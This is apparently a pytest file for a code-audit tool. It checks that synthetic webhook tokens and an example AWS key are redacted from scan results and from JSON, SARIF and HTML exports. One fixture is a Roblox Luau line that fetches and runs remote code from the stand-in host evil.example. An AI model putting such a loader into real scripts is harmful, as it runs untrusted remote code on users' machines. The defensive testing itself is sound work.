"""Fase 6.3 (P1, caso 16) — Redaccion central de secretos.

Ningun secreto sintetico completo llega a: resultado persistido,
JSON, SARIF, HTML ni PDF. El contexto del hallazgo se conserva.
"""
from pathlib import Path

FAKE = "SYNTHETIC_ONLY_NOT_A_REAL_WEBHOOK_TOKEN_12345"


def test_redact_text_masks_webhook_token():
    from src.redaction import redact_text

    s = f'HttpService:PostAsync("https://discord.com/api/webhooks/123/{FAKE}", data)'
    out = redact_text(s)
    assert FAKE not in out, "token de webhook sin redactar"
    assert "[REDACTED]" in out


def test_redact_text_masks_aws_key():
    from src.redaction import redact_text

    key = "AKIAIOSFODNN7EXAMPLE"
    out = redact_text(f'aws_key = "{key}"')
    assert key not in out, "AWS key sin redactar"


def test_redact_text_keeps_normal_code():
    from src.redaction import redact_text

    code = (
        'local f = loadstring(game:HttpGet("http://evil.example/x"))()\n'
        "local m = require(1234567890)\n"
    )
    assert redact_text(code) == code, "la redaccion no debe alterar codigo sin secretos"


def test_result_and_exports_never_contain_raw_token(tmp_path):
    from src.config import CodeAuditConfig
    from src.engine import CodeAuditEngine
    from src.report_generator import generate_html, generate_json
    from src.sarif_exporter import generate_sarif

    target = tmp_path / "leak"
    target.mkdir()
    (target / "webhook.luau").write_text(
        f'HttpService:PostAsync("https://discord.com/api/webhooks/123/{FAKE}", data)\n'
    )

    cfg = CodeAuditConfig()
    cfg.scanners.custom_rules_path = "roblox"
    cfg.scanners.dep_analyzer = False
    result = CodeAuditEngine(cfg).scan(str(target))

    assert FAKE not in result.model_dump_json(), \
        "token crudo en el resultado (persistencia)"

    out = tmp_path / "exports"
    out.mkdir()
    jp = generate_json(result, out / "r.json")
    sp = generate_sarif(result, out / "r.sarif")
    hp = generate_html(result, out / "r.html")
    for p in (jp, sp, hp):
        text = Path(str(p)).read_text()
        assert FAKE not in text, f"token crudo en {p}"
    assert "[REDACTED]" in Path(str(sp)).read_text(), \
        "el SARIF debe conservar el snippet ya redactado"


def test_redacted_snippet_preserves_context(tmp_path):
    from src.config import CodeAuditConfig
    from src.engine import CodeAuditEngine

    target = tmp_path / "leak2"
    target.mkdir()
    (target / "webhook.luau").write_text(
        f'HttpService:PostAsync("https://discord.com/api/webhooks/123/{FAKE}", data)\n'
    )
    cfg = CodeAuditConfig()
    cfg.scanners.custom_rules_path = "roblox"
    cfg.scanners.dep_analyzer = False
    result = CodeAuditEngine(cfg).scan(str(target))

    blob = result.model_dump_json()
    assert "[REDACTED]" in blob, "redaccion no aplicada al snippet"
    assert "discord.com/api/webhooks" in blob, \
        "el contexto del hallazgo debe conservarse tras redactar"
